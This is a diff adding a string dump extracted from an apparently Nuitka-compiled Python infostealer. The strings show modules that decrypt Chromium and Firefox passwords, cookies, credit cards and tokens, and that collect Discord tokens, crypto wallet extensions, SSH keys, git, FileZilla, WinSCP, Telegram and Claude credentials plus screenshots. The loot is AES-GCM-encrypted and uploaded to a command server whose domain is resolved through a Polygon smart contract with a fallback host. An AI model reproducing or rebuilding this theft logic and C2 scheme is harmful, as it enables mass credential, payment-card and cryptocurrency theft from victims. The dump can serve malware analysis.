@@ -1,0 +1,5624 @@
+.bytecode
+a__module__
+a__class__
+a__name__
+a__package__
+a__metaclass__
+a__abstractmethods__
+a__closure__
+a__dict__
+a__doc__
+a__file__
+a__path__
+a__enter__
+a__exit__
+a__builtins__
+a__all__
+a__init__
+a__cmp__
+a__iter__
+a__loader__
+a__compiled__
+a__nuitka__
+ainspect
+acompile
+arange
+aopen
+asuper
+asum
+aformat
+a__import__
+abytearray
+astaticmethod
+aclassmethod
+akeys
+aget
+aname
+aglobals
+alocals
+afromlist
+alevel
+aread
+wrwwwbalower
+w/w\apath
+abasename
+adirname
+aabspath
+aisabs
+anormpath
+aexists
+aisdir
+aisfile
+alistdir
+astat
+alstat
+aclose
+agetattr
+a__cached__
+aprint
+aend
+afile
+abytes
+w.w_asend
+athrow
+a__spec__
+a_initializing
+aparent
+atypes
+aascii
+apunycode
+aloader
+aas_file
+aregister
+a__class_getitem__
+areconfigure
+aencoding
+aline_buffering
+a__match_args__
+a__aenter__
+a__aexit__
+asplit
+afileno
+aargs
+.app.config
+atrace
+uarg.parse
+aLoggingManager
+aadd
+a_MODULE
+uParsing arguments
+aLogType
+aDEBUG
+uStarting argument parser initialization
+aargparse
+aArgumentParser
+aadd_argument
+u--user-id
+u4015d0e9-4cab-4ac1-8dfd-5ee8f283bca1
+adefault
+u--host
+arequired
+adefault
+u--env
+aprod
+u--prefireId
+u--mcInfo
+u--tag
+u--dk
+naparse_args
+auser_id
+aUSER_ID
+aenv
+aENV
+aprefireId
+aPREFIRE_ID
+atag
+aTAG
+ahashlib
+asha256
+aencode
+ahexdigest
+a_DEBUG_KEY_HASH
+aDEBUG_DUMP
+nsu.d:
+acontract
+afetch_domain
+aAPI_HOST
+uhost.
+uc2.1
+udbg.mode
+uDEBUG DUMP MODE
+aWARN
+uData will be dumped locally, not sent to server
+uConfig loaded
+aINFO
+uuser_id=
+u, host=
+u, env=
+u, debug=
+upf:
+uPrefire mode
+uprefireId=
+uc4.1
+utag:
+uTag set
+utag=
+amcInfo
+abase64
+ab64decode
+adecode
+uutf-8
+ajson
+aloads
+aMC_INFO
+umc.b64.k
+umc.k
+uMC info parsed
+umcInfo keys: 
+akeys
+aNone
+aJSONDecodeError
+umc.json.fail
+uMC info parse failed
+aERROR
+uConfig init complete
+uAll configuration values set
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+a__annotations__
+asys
+alogging
+aLoggingManager
+aLogType
+acontract
+atrace
+Ostr
+Odict
+aconfig
+u371ceed8c677604185c6ed944a01710ac0c79759a81a9d7061c2e100d2e2e3b4
+ainit
+uapp\config.py
+u<module app.config>
+aparser
+aargs
+adecoded
+wea__spec__
+.app
+a__mro_entries__
+abases
+u'%s' object is not a mapping
+a__name__
+adatetime
+anow
+astrftime
+u%Y%m%d_%H%M%S
+ajoin
+a__file__
+adebug_dump
+amakedirs
+aexist_ok
+taLoggingManager
+aadd
+a_MODULE
+uDebug dump started
+aLogType
+aINFO
+udir=
+sauser_data
+acopy
+aget
+ascreenshot
+ascreenshot
+:nldnu... [TRUNCATED, 
+u chars total]
+uuser_data.json
+wwuutf-8
+a__enter__
+a__exit__
+ajson
+adump
+aindent
+adefault
+Ostr
+nnnuDumped user_data
+aDEBUG
+upath=
+acollected_files
+afiles
+afiles_dir
+acategory
+avalue
+aname
+awrite
+adata
+uDumped file
+uname=
+u category=
+ulogs.json
+aget_logs
+aindent
+uDumped logs
+uDebug dump complete
+uDump all collected data to local directory for debugging.
+atrace
+asl0
+aempty
+uNo logs to submit
+uLog list is empty
+aconfig
+aUSER_ID
+alog_uuid
+asl1
+anoid
+uCannot submit logs
+aWARN
+uMissing userId and logUuid
+asl2
+wnuSubmitting logs
+ucount=
+alogs
+auserId
+alogUuid
+ahttp
+ashard_post
+u/submitLogs
+asl3
+uLogs submitted
+uSuccessfully sent logs to server
+asl4
+astatus_code
+wNuLog submission failed
+aERROR
+uresp=
+aNone
+uCrypto.Cipher
+aAES
+aAES
+uCrypto.Random
+aget_random_bytes
+aget_random_bytes
+asd0
+wkuSubmitting data
+ukeys=
+akeys
+adumps
+aencode
+uutf-8
+azlib
+acompress
+alevel
+L l/l
+lwl}l
+l1l|l
+l|l_l
+lr;l
+anew
+aMODE_GCM
+anonce
+aencrypt_and_digest
+ab64encode
+adecode
+aascii
+u/submitData
+asd1
+uno.resp
+uData submission failed
+uNo response received
+asd2
+ustatus=
+alogUuid
+suData submitted
+ulogUuid=
+nu...
+uno logUuid
+asubmission_succeeded
+asd3
+uok.
+nanoid
+asd4
+nuParse response failed
+asf0
+anoid
+uCannot submit files
+uNo logUuid available
+asf1
+uSubmitting files
+uUploading file 
+w/afile
+uX-Tracking-ID
+u/submitFile
+afiles
+aextra_headers
+asf2
+u.ok
+uFile uploaded 
+asf3
+u.fail
+uFile upload failed 
+aclear
+ainit
+atime
+uStarting ManagementEngine
+uInitializing application
+aenable_doh
+acfg
+ainit
+aFabric
+aForge
+aDoubleClick
+aRemote
+aEXE
+aDLL
+aCaptcha
+aDiscordInjection
+aPowershell
+aENV
+aMinecraft
+aCPyRuntime
+aUnknown
+aexecutionEnvironment
+aexecutionEnvironmentType
+aPREFIRE_ID
+aprefireId
+aTAG
+atag
+aMC_INFO
+aminecraftInfo
+uConfig complete
+uenv=
+u type=
+u took=
+ucfg.ok.
+naDEBUG_DUMP
+aAPI_HOST
+ua2.1
+ustg.start
+astaging
+astage_async
+asys
+asystem_info
+aget_system_info
+asystemInfo
+ascr
+atake_screenshot
+adsc
+adiscord
+aget_discord_tokens
+adiscordTokens
+ubrw.cr
+abrowser
+aget_browser_data
+ubrw.fx
+afirefox
+aget_firefox_passwords
+aget_firefox_cookies
+aget_firefox_autofills
+apasswords
+acookies
+acreditCards
+agoogleTokens
+aautofills
+abrowserData
+ubrw.ok.p
+ubrw.fil
+aget_browser_files
+aget_firefox_files
+aappend
+aa10
+amcr
+aminecraft
+aget_minecraft_files
+aa11
+awal
+awallets
+aget_wallet_files
+aa12
+aext
+abrowser_extensions
+aget_browser_extension_files
+aa13
+acred
+acredentials
+aget_credential_files
+aa14
+akeywords
+aget_keyword_files
+aa15
+ufil.ok.
+aget_file_info
+afileInfo
+aa16
+udbg.dmp
+a_debug_dump
+aa16
+usub.dat
+a_submit_data
+aa17
+usub.fil
+a_submit_files
+ua.fatal
+:nl2nuFatal error
+uDebug execution complete
+utotal=
+aa99
+udbg.fin.
+aa18
+aretry
+uRetrying submission
+uPrimary submission failed, attempting retry
+aa19
+alogs
+a_submit_logs
+ais_alive
+aa20
+ustg.wait
+uWaiting for staging
+uStaging still running, waiting...
+aa21
+ustg.done
+uStaging complete
+uStaging thread finished
+uExecution complete
+ums logs=
+a__doc__
+apath
+adirname
+aenviron
+aNUITKA_PACKAGE_app
+u\not_existing
+a__path__
+aorigin
+ahas_location
+asubmodule_search_locations
+a__cached__
+a__annotations__
+asys
+abase64
+ab64encode
+adatetime
+aconfig
+ahttp
+astaging
+atrace
+alogging
+aLoggingManager
+aLogType
+ahandlers
+asystem_info
+ascreenshot
+adiscord
+abrowser
+afirefox
+aminecraft
+awallets
+abrowser_extensions
+acredentials
+akeywords
+aapp
+arun
+uapp\__init__.py
+u<module app>
+atimestamp
+adump_dir
+adump_data
+aoriginal_len
+adata_path
+wfafiles_dir
+ahit_file
+acategory_dir
+afile_path
+alogs_path
+aAES
+aget_random_bytes
+a_cipher
+a_ct
+aresp
+abody
+atotal
+wiahit_file
+afiles
+aheaders
+aresp
+alogs
+apayload
+aresp
+astart_time
+astaging_thread
+aminecraft_envs
+acpy_envs
+aenv_type
+aelapsed
+achromium_passwords
+achromium_cookies
+achromium_cards
+achromium_tokens
+achromium_autofills
+afirefox_passwords
+afirefox_cookies
+afirefox_autofills
+abrowser_files
+afirefox_files
+ahit_file
+aminecraft_files
+awallet_files
+aextension_files
+acredential_files
+aexisting_names
+akeyword_files
+weatotal_elapsed
+a__spec__
+.app.contract
+astartswith
+nns:l@l
+afromhex
+adecode
+uutf-8
+aLoggingManager
+aadd
+a_MODULE
+uABI decode failed
+aLogType
+aWARN
+uDecode ABI-encoded string from eth_call response.
+atrace
+act0
+afetch
+ajson
+adumps
+ajsonrpc
+u2.0
+amethod
+aeth_call
+aparams
+aCONTRACT_ADDRESS
+adata
+aFUNCTION_SELECTOR
+alatest
+aencode
+uContent-Type
+uapplication/json
+aRPC_ENDPOINTS
+aurllib
+arequest
+aRequest
+apayload
+aheaders
+aPOST
+adata
+aheaders
+amethod
+aurlopen
+atimeout
+a__enter__
+a__exit__
+aloads
+aread
+aresult
+a_decode_abi_string
+act1
+uok.
+uDomain resolved
+aINFO
+udomain=
+u endpoint=
+nnnuRPC endpoint 
+u failed
+aDEBUG
+act2
+afallback
+uUsing fallback domain
+aFALLBACK_DOMAIN
+uFetch domain from Polygon smart contract, fallback to backup domain.
+Smart contract domain resolution for C2 infrastructure.
+Fetches domain from Polygon smart contract with fallback.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+uurllib.request
+uurllib.error
+atrace
+alogging
+aLoggingManager
+aLogType
+acontract
+u0x9c0a507300fd902787bb193d80fca5ce6e1bff9a
+u0xce6d41de
+usltnnt.ru
+uhttps://polygon-rpc.com
+uhttps://rpc-mainnet.matic.quiknode.pro
+uhttps://polygon-public.nodies.app
+uhttps://1rpc.io/matic
+uhttps://polygon-mainnet.rpcfast.com?api_key=xbhWBI1Wkguk8SNMu1bvvLurPGLXmgwYeC4S6g2H7WdwFigZSmPWVZRxrskEQwIf
+uhttps://polygon-bor-rpc.publicnode.com
+uhttps://go.getblock.io/02667b699f05444ab2c64f9bff28f027
+uhttps://api.zan.top/polygon-mainnet
+uhttps://polygon.rpc.subquery.network/public
+uhttps://endpoints.omniatech.io/v1/matic/mainnet/public
+ahex_data
+areturn
+Ostr
+areturn
+Ostr
+afetch_domain
+uapp\contract.py
+u<module app.contract>
+ahex_data
+adata
+alength
+astring_hex
+apayload
+aheaders
+wiaendpoint
+areq
+aresponse
+aresult
+adomain
+wea__spec__
+.app.crypto
+atrace
+acr0
+uenc.start
+ajson
+adumps
+aencode
+uutf-8
+acr1
+ujson.
+saLoggingManager
+aadd
+a_MODULE
+uSerialized payload
+aLogType
+aDEBUG
+usize=
+azlib
+acompress
+alevel
+acr2
+uzlib.
+w.u.0f
+w%uCompressed payload
+u ratio=
+u.1f
+aget_random_bytes
+aAES
+anew
+aMODE_GCM
+anonce
+aencrypt_and_digest
+acr3
+uaes.
+uEncrypted payload
+uciphertext=
+u nonce=
+anonce
+u tag=
+ab64encode
+adecode
+aascii
+acr4
+ub64.
+uEncoded payload
+aINFO
+ufinal_size=
+    Compress + encrypt dict payload with AES-256-GCM.
+    Returns base64 string: nonce(12) || tag(16) || compressed_ciphertext
+    
+ato_bytes
+abig
+u<genexpr>
+uencrypt_submission.<locals>.<genexpr>
+AES-GCM encryption for hit submission (with zlib compression)
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+abase64
+ab64encode
+uCrypto.Cipher
+aAES
+uCrypto.Random
+aget_random_bytes
+atrace
+alogging
+aLoggingManager
+aLogType
+acrypto
+adata
+areturn
+Odict
+Ostr
+aencrypt_submission
+uapp\crypto.py
+wcu<module app.crypto>
+adata
+aplaintext
+aplaintext_size
+acompressed
+acompressed_size
+aratio
+anonce
+acipher
+aciphertext
+atag
+ablob
+aencoded
+a__spec__
+.app.handlers.browser
+ajoin
+adata_path
+uLocal State
+a_get_local_state_path
+uCheck if browser data directory exists.
+wruutf-8
+a__enter__
+a__exit__
+ajson
+aload
+nnnalocal_state
+aget
+aos_crypt
+aapp_bound_encrypted_key
+abase64
+ab64decode
+nnaLoggingManager
+aadd
+a_MODULE
+uFailed to get ABE key
+aLogType
+aERROR
+upath=
+su error=
+uExtract ABE encrypted key from Local State file.
+adpapi_key
+aabe_key
+aname
+nalower
+atrace
+wtub.k.
+afetch
+aget_browser_dpapi_master_key
+udpapi.ok
+uDPAPI key prefetched
+aDEBUG
+ubrowser=
+wxudpapi.nil
+uDPAPI key not found
+aWARN
+udpapi.ex
+uDPAPI key prefetch failed
+ahas_abe
+a_get_abe_encrypted_key
+adecrypt_abe_key
+aapplication_name
+uabe.ok
+uABE key prefetched
+uabe.dec.fail
+uABE key decryption failed
+uNo ABE key in Local State
+uabe.ex
+uABE key prefetch failed
+uPrefetch both DPAPI and ABE keys for a browser. Skips if already fetched.
+cv20
+uNo ABE key for v20 value
+agcm_decrypt
+uv20 decryption failed
+cv10
+uNo DPAPI key for v10 value
+uv10 decryption failed
+adpapi_decrypt
+uLegacy DPAPI decryption failed
+uDecrypt a browser-encrypted value using the appropriate key. Returns raw bytes.
+a_decrypt_value
+adecode
+uutf-8
+uDecrypt a password value and return as string.
+:l nnT
+uutf-8
+aignore
+aerrors
+uDecrypt a cookie value, handling the 32-byte header for Chrome/Edge.
+aDefault
+astartswith
+uProfile 
+abrowser
+aprofiles
+uGet all profile directories for a browser.
+uLogin Data
+aget_temp_copy
+asuffix
+u.db
+uFailed to copy Login Data
+u profile=
+asqlite3
+aconnect
+acursor
+aexecute
+uSELECT origin_url, username_value, password_value FROM logins
+afetchall
+uLogin entries found
+uprofile=
+u count=
+a_decrypt_password
+apasswords
+aurl
+uN/A
+ausername
+apassword
+aprofile
+aclose
+uPassword extraction failed
+aunlink
+atemp_db
+uExtract passwords from a single profile's Login Data file.
+a_get_profiles
+uNo profiles found
+uExtracting passwords
+u profiles=
+a_get_passwords_from_profile
+aall_passwords
+uPasswords extracted
+aINFO
+uExtract all passwords from a browser.
+aNetwork
+aCookies
+uFailed to copy Cookies
+uSELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies
+uCookie entries found
+a_decrypt_cookie
+acookies
+ahostKey
+avalue
+apath
+w/aexpiresUtc
+aNone
+uCookie extraction failed
+uExtract cookies from a single profile's Cookies file.
+uExtracting cookies
+a_get_cookies_from_profile
+aall_cookies
+uCookies extracted
+uExtract all cookies from a browser.
+uWeb Data
+uFailed to copy Web Data
+uSELECT guid, value_encrypted FROM local_stored_cvc
+acvc_map
+uSELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards
+uCard entries found
+acards
+amonth
+ayear
+anumber
+acvc
+aprofile_name
+uCard extraction failed
+uExtract credit cards from a single profile's Web Data file.
+uExtracting cards
+a_get_cards_from_profile
+aall_cards
+uCards extracted
+uExtract all credit cards from a browser.
+uSELECT service, encrypted_token FROM token_service
+uToken entries found
+afake
+atokens
+aaccountId
+atoken
+uToken extraction failed
+uExtract Google tokens from a single profile's Web Data file.
+uExtracting tokens
+a_get_tokens_from_profile
+aall_tokens
+uTokens extracted
+uExtract all Google tokens from a browser.
+uSELECT name, value FROM autofill
+uAutofill entries found
+aautofills
+uAutofill extraction failed
+uExtract autofill entries from a single profile's Web Data file.
+uExtracting autofills
+a_get_autofills_from_profile
+aall_autofills
+uAutofills extracted
+uExtract all autofill entries from a browser.
+a_browser_exists
+ppppub.
+afound
+uFound browser
+a_prefetch_keys
+anokey
+uNo decryption keys
+apwd
+a_get_passwords
+acok
+a_get_cookies
+acrd
+a_get_cards
+atok
+a_get_tokens
+aatf
+a_get_autofills
+wpu.c
+uExtract passwords, cookies, cards, tokens, and autofills from a browser.
+uStarting password extraction
+uScanning installed browsers
+aCHROMIUM_BROWSERS
+uPassword extraction complete
+utotal=
+uGet passwords from all installed browsers.
+uStarting cookie extraction
+uCookie extraction complete
+uGet cookies from all installed browsers.
+uscan.
+uStarting browser data extraction
+a_extract_from_browser
+uBrowser data extraction complete
+upasswords=
+u cookies=
+u cards=
+u tokens=
+u autofills=
+uGet passwords, cookies, cards, tokens, and autofills from all installed browsers.
+adatetime
+adatetime
+afromtimestamp
+astrftime
+u%Y-%m-%d %H:%M:%S
+uConvert Chrome timestamp (microseconds since 1601) to readable date.
+aHistory
+uSELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5000
+u | 
+u entries
+nu...
+w-:nl
+na_format_chrome_time
+alines
+ux | 
+uHistory extraction failed
+uExtract history entries from a single profile's History file as readable text.
+aBookmarks
+aRoot
+uRecursively extract bookmarks from the JSON structure.
+aextract_bookmarks
+u_get_bookmarks_from_profile.<locals>.extract_bookmarks
+abookmarks_data
+aroots
+aitems
+uBrowser: 
+uProfile: 
+uTotal Bookmarks: 
+u================================================================================
+asorted
+w[w]u  
+aappend
+u    
+uBookmarks extraction failed
+uExtract bookmarks from a single profile's Bookmarks file as readable text.
+atype
+aname
+sabookmarks_by_folder
+aurl
+safolder
+aRoot
+achildren
+anew_folder
+u<genexpr>
+u_get_bookmarks_from_profile.<locals>.<genexpr>
+abf0
+astart
+uStarting browser files extraction
+uExtracting history and bookmarks
+areplace
+w w_a_get_history_from_profile
+w_u_History.txt
+afiles
+aHitFile
+aHitFileCategory
+aBROWSER
+aencode
+adata
+uHistory file created
+a_get_bookmarks_from_profile
+u_Bookmarks.txt
+uBookmarks file created
+abf9
+wnuBrowser files extraction complete
+ufiles=
+uGet history and bookmarks files from all installed browsers.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+adataclasses
+adataclass
+afield
+adataclass
+afield
+atrace
+alogging
+aLoggingManager
+aLogType
+autil
+adpapi_decrypt
+aget_browser_dpapi_master_key
+agcm_decrypt
+uutil.dll_injection
+adecrypt_abe_key
+uutil.handle_copy
+aget_temp_copy
+aHitFile
+aHitFileCategory
+aenviron
+aAPPDATA
+saAPPDATA
+aLOCALAPPDATA
+saLOCALAPPDATA
+a__module__
+aChromiumBrowser
+a__qualname__
+a__annotations__
+adefault
+arepr
+Obytes
+uGoogle Chrome
+u\Google\Chrome\User Data
+uchrome.exe
+uMicrosoft Edge
+u\Microsoft\Edge\User Data
+umsedge.exe
+aBrave
+u\BraveSoftware\Brave-Browser\User Data
+ubrave.exe
+uOpera GX
+u\Opera Software\Opera GX Stable
+uopera.exe
+aOpera
+u\Opera Software\Opera Stable
+aVivaldi
+u\Vivaldi\User Data
+uvivaldi.exe
+aChromium
+u\Chromium\User Data
+uchromium.exe
+aYandex
+u\Yandex\YandexBrowser\User Data
+ubrowser.exe
+aCocCoc
+u\CocCoc\Browser\User Data
+aTorch
+u\Torch\User Data
+utorch.exe
+uComodo Dragon
+u\Comodo\Dragon\User Data
+udragon.exe
+uEpic Privacy
+u\Epic Privacy Browser\User Data
+uepic.exe
+aSlimjet
+u\Slimjet\User Data
+uslimjet.exe
+aCentBrowser
+u\CentBrowser\User Data
+u7Star
+u\7Star\7Star\User Data
+u7star.exe
+aChedot
+u\Chedot\User Data
+uchedot.exe
+aIridium
+u\Iridium\User Data
+uiridium.exe
+areturn
+alocal_state_path
+areturn
+Ostr
+Obytes
+aencrypted_value
+Ostr
+Ostr
+aprofile_path
+Odict
+AOlist
+Odict
+AOlist
+Odict
+AOlist
+Odict
+AOlist
+Odict
+AOlist
+Odict
+areturn
+AOlist
+Odict
+aget_browser_passwords
+aget_browser_cookies
+areturn
+AOtuple
+AOlist
+Odict
+AOlist
+Odict
+AOlist
+Odict
+AOlist
+Odict
+AOlist
+Odict
+aget_browser_data
+achrome_time
+areturn
+Oint
+Ostr
+aget_browser_files
+uapp\handlers\browser.py
+wbu<module app.handlers.browser>
+a__class__
+abrowser
+aencrypted_value
+abrowser
+adecrypted
+aencrypted_value
+abrowser
+abrowser
+abname
+apasswords
+acookies
+acards
+atokens
+aautofills
+achrome_time
+aunix_time
+adatetime
+alocal_state_path
+wfalocal_state
+aencrypted_key_b64
+aencrypted_key_with_prefix
+abrowser
+aall_autofills
+aprofiles
+aprofile_path
+aautofills
+abrowser
+aprofile_path
+aautofills
+atemp_db
+aweb_data_path
+aprofile_name
+aconn
+acursor
+arows
+aname
+avalue
+abrowser
+aprofile_path
+abookmarks_path
+abookmarks_by_folder
+wfabookmarks_data
+aextract_bookmarks
+aroots
+aroot_name
+aroot_node
+alines
+atotal
+afolder
+abookmarks
+abrowser
+aall_cards
+aprofiles
+aprofile_path
+acards
+abrowser
+aprofile_path
+acards
+atemp_db
+aweb_data_path
+aprofile_name
+aconn
+acursor
+acvc_map
+aguid
+aencrypted_cvc
+adecrypted
+arows
+aname
+amonth
+ayear
+aencrypted_number
+adecrypted_number
+abrowser
+aall_cookies
+aprofiles
+aprofile_path
+acookies
+abrowser
+aprofile_path
+acookies
+atemp_db
+acookies_path
+aprofile_name
+aconn
+acursor
+arows
+ahost
+aname
+apath
+ais_secure
+ais_httponly
+aexpires
+aencrypted_value
+adecrypted
+abrowser
+aprofile_path
+atemp_db
+ahistory_path
+alines
+aconn
+acursor
+arows
+aurl
+atitle
+avisit_count
+alast_visit_time
+atitle_str
+aurl_str
+avisits
+atime_str
+abrowser
+aall_passwords
+aprofiles
+aprofile_path
+apasswords
+abrowser
+aprofile_path
+apasswords
+atemp_db
+alogin_data_path
+aprofile_name
+aconn
+acursor
+arows
+aurl
+ausername
+aencrypted_password
+adecrypted
+abrowser
+aprofiles
+adefault_path
+aitem
+aprofile_path
+abrowser
+aall_tokens
+aprofiles
+aprofile_path
+atokens
+abrowser
+aprofile_path
+atokens
+atemp_db
+aweb_data_path
+aprofile_name
+aconn
+acursor
+arows
+aservice
+aencrypted_token
+adecrypted
+abrowser
+abname
+alocal_state_path
+weaencrypted_abe_key
+anode
+afolder
+anode_type
+aname
+anew_folder
+achild
+abookmarks_by_folder
+aextract_bookmarks
+abookmarks_by_folder
+aextract_bookmarks
+aall_cookies
+abrowser
+acookies
+aall_passwords
+aall_cookies
+aall_cards
+aall_tokens
+aall_autofills
+abrowser
+apasswords
+acookies
+acards
+atokens
+aautofills
+afiles
+abrowser
+aprofiles
+aprofile_path
+aprofile_name
+asafe_browser_name
+asafe_profile_name
+ahistory_text
+afile_name
+abookmarks_text
+aall_passwords
+abrowser
+apasswords
+a__name__
+a__spec__
+.app.handlers.browser_extensions
+ajoin
+aDefault
+astartswith
+uProfile 
+abrowser_path
+aprofiles
+uGet all profile directories for a browser.
+atrace
+ascan
+aBROWSER_PATHS
+a_get_profiles
+nsu.p
+areplace
+w w_aWALLET_EXTENSIONS
+aprofile_path
+uLocal Extension Settings
+w_u.zip
+aHitFile
+aHitFileCategory
+aWEB3
+apath
+aready_for_upload
+afiles
+naLoggingManager
+aadd
+a_MODULE
+uCollected 
+aLogType
+aDEBUG
+ubrowser=
+u profile=
+wnuBrowser extensions collected
+aINFO
+ucount=
+uCollect all browser wallet extension files.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+atrace
+alogging
+aLoggingManager
+aLogType
+aHitFile
+aHitFileCategory
+abrowser_ext
+agetenv
+aAPPDATA
+sa_APPDATA
+aLOCALAPPDATA
+sa_LOCALAPPDATA
+aChrome
+aGoogle
+uUser Data
+aChrome_x86
+uGoogle(x86)
+aChromeSxS
+uChrome SxS
+aEdge
+aMicrosoft
+aBrave
+aBraveSoftware
+uBrave-Browser
+aOpera
+uOpera Software
+uOpera Stable
+aOperaGX
+uOpera GX Stable
+aYandex
+aYandexBrowser
+aChromium
+aThorium
+aMaple
+aMapleStudio
+aChromePlus
+aIridium
+u7Star
+aCentBrowser
+aChedot
+aVivaldi
+aKometa
+aElements
+uElements Browser
+aEpicPrivacy
+uEpic Privacy Browser
+aUran
+auCozMedia
+aFenrir
+uFenrir Inc
+aSleipnir5
+asetting
+amodules
+aChromiumViewer
+aCatalina
+aCatalinaGroup
+aCitrio
+aCoowon
+aLiebao
+aliebao
+aQIPSurf
+uQIP Surf
+aOrbitum
+aDragon
+aComodo
+u360Browser
+aBrowser
+aMaxthon
+aMaxthon3
+aKMelon
+uK-Melon
+aCocCoc
+aAmigo
+aTorch
+aSputnik
+aDCBrowser
+aURBrowser
+uUR Browser
+aSlimjet
+aAuthenticator
+abhghoamapcdpbohphigoooaddinpkbai
+aBinance
+afhbohimaelbohpjbbldcngcnapndodjp
+aBitapp
+afihkakfobkmkjojpchpfgcmhfjnmnfpi
+aBoltX
+aaodkkagnadcbobfpggfnjeongemjbjca
+aCoin98
+aaeachknmefphepccionboohckonoeemg
+aCoinbase
+ahnfanknocfeofbddgcijnmhnfnkdnaad
+aCore
+aagoakfejjabomempkjlepdflaleeobhb
+aCrocobit
+apnlfjmlcjdjgkddecgincndfgegkecke
+aEqual
+ablnieiiffboillknjnepogjhkgnoapac
+aEver
+acgeeodpfagjceefieflmdfphplkenlfk
+aExodusWeb3
+aaholpfdialjgjfhomihkjbmgjidlcdno
+aFewcha
+aebfidpplhabeedpnhjnobghokpiioolj
+aFinnie
+acjmkndjhnagcfbpiemnkdpomccnjblmj
+aGuarda
+ahpglfhgfnhbgpjdenjgmdgoeiappafln
+aGuild
+ananjmdknhkinifnkgdcggcfnhdaammmj
+aHarmonyOutdated
+afnnegphlobjdpkhecapkijjdkgcjhkib
+aIconex
+aflpiciilemghbmfalicajoolhkkenfel
+aJaxxLiberty
+acjelfplplebdjjenllpjcblmjkfcffne
+aKaikas
+ajblndlipeogpafnldhgmapagcccfchpi
+aKardiaChain
+apdadjkfkgcafgbceimcpbkalnfnepbnk
+aKeplr
+admkamcknogkgcdfhhbddcghachkejeap
+aLiquality
+akpfopkelmapcoipemfendmdcghnegimn
+aMEWCX
+anlbmnnijcnlegkjjpcfjclmcfggfefdm
+aMaiarDEFI
+adngmlblcodfobpdpecaadgfbcggfjfnm
+aMartian
+aefbglgofoippbgcjepnhiblaibcnclgk
+aMath
+aafbcbjpbpfadlkmhmclhkeeodmamcflc
+aMetamask
+ankbihfbeogaeaoehlefnkodbefgpgknn
+aMetamask2
+aejbalbakoplchlghecdalmeeeajnimhm
+aMobox
+afcckkdbjnoikooededlapcalpionmalo
+aNami
+alpfcbjknijpeeillifnkikgncikgfhdo
+aNifty
+ajbdaocneiiinmjbjlgalhcelgbejmnid
+aOxygen
+afhilaheimglignddkjgofkcbgekhenbh
+aPaliWallet
+amgffkfbidihjpoaomajlbgchddlicgpn
+aPetra
+aejjladinnckdgjemekebdpeokbikhfci
+aPhantom
+abfnaelmomeimhlpmgjnjophhpkkoljpa
+aPontem
+aphkbamefinggmakgklpkljjmgibohnba
+aRonin
+afnjhmkhhmkbjkkabndcnnogagogbneec
+aSafepal
+algmpcpglpngdoalbgeoldeajfclnhafa
+aSaturn
+ankddgncdjgjfcddamfgcmfnlhccnimig
+aSlope
+apocmplpaccanhmnllbbkpgfliimjljgo
+aSolflare
+abhhhlbepdkbapadjdnnojkbgioiodbic
+aSollet
+afhmfendgdocmcbmfikdcogofphimnkno
+aStarcoin
+amfhbebgoclkghebffdldpobeajmbecfk
+aSwash
+acmndjbecilbocjfkibfbifhngkdmjgog
+aTempleTezos
+aookjlbkiijinhpmnjffcofjonbfbgaoc
+aTerraStation
+aaiifbnbfobpmeekipheeijimdpnlpgpp
+aTokenpocket
+amfgccjchihfkkindfppnaooecgfneiii
+aTon
+anphplpgoakhhjchkkhmiggakijnkhfnd
+aTron
+aibnejdfjmmkpcnlpebklmnkoeoihofec
+aTrustWallet
+aegjidjbpglichdcondbcbdnbeeppgdph
+aWombat
+aamkmjjmmflddogmhpjloimipbofnfjih
+aXDEFI
+ahmeobnfnfcmdkdcmlblgagmfpfboieaf
+aXMRPT
+aeigblbgjknlfbajkfhopmcojidlgcehm
+aXinPay
+abocpokimicclpaiekenaeelehdjllofo
+aYoroi
+affnbelfdoeiohenkjibnmadjiehjhajb
+aiWallet
+akncchdigobghenbbaddojjnnaogfppfj
+abrowser_path
+areturn
+Ostr
+AOlist
+Ostr
+areturn
+aget_browser_extension_files
+uapp\handlers\browser_extensions.py
+u<module app.handlers.browser_extensions>
+abrowser_path
+aprofiles
+adefault_path
+aitem
+aprofile_path
+afiles
+abrowser_name
+abrowser_path
+aprofiles
+aprofile
+aprofile_path
+asafe_profile
+aext_name
+aext_id
+aext_path
+afile_name
+ahit_file
+a__spec__
+.app.handlers
+a__doc__
+a__file__
+apath
+adirname
+ajoin
+aenviron
+aget
+aNUITKA_PACKAGE_app
+u\not_existing
+ahandlers
+aNUITKA_PACKAGE_app_handlers
+u\not_existing
+a__path__
+aorigin
+ahas_location
+asubmodule_search_locations
+a__cached__
+asystem_info
+aget_system_info
+aget_system_info
+ascreenshot
+atake_screenshot
+atake_screenshot
+adiscord
+aget_discord_tokens
+aget_discord_tokens
+abrowser
+aget_browser_passwords
+aget_browser_cookies
+aget_browser_passwords
+aget_browser_cookies
+afirefox
+aget_firefox_passwords
+aget_firefox_cookies
+aget_firefox_passwords
+aget_firefox_cookies
+aminecraft
+aget_minecraft_files
+aget_minecraft_files
+awallets
+aget_wallet_files
+aget_wallet_files
+abrowser_extensions
+aget_browser_extension_files
+aget_browser_extension_files
+acredentials
+aget_credential_files
+aget_credential_files
+akeywords
+aget_keyword_files
+aget_keyword_files
+uapp\handlers\__init__.py
+u<module app.handlers>
+sa__spec__
+.app.handlers.credentials
+atrace
+acr0
+ascan
+a_get_telegram_data
+uGit_Credentials.txt
+ajoin
+a_USER_HOME
+u.git-credentials
+uSSH_Keys.zip
+u.ssh
+uFileZilla_RecentServers.xml
+a_APPDATA
+aFileZilla
+urecentservers.xml
+uFileZilla_SiteManager.xml
+usitemanager.xml
+uWinSCP_Config.ini
+uWinSCP.ini
+uRiotGames_Settings.yaml
+a_LOCALAPPDATA
+uRiot Games
+uRiot Client
+aData
+uRiotGamesPrivateSettings.yaml
+uThunderbird_Profiles.zip
+aThunderbird
+aProfiles
+uClaude_Credentials.json
+u.claude
+u.credentials.json
+aHitFile
+aHitFileCategory
+aLOGIN
+apath
+aready_for_upload
+afiles
+acr1
+naLoggingManager
+aadd
+a_MODULE
+uCollected 
+saLogType
+aDEBUG
+upath=
+a_get_roblox_cookies
+a_get_obs_stream_keys
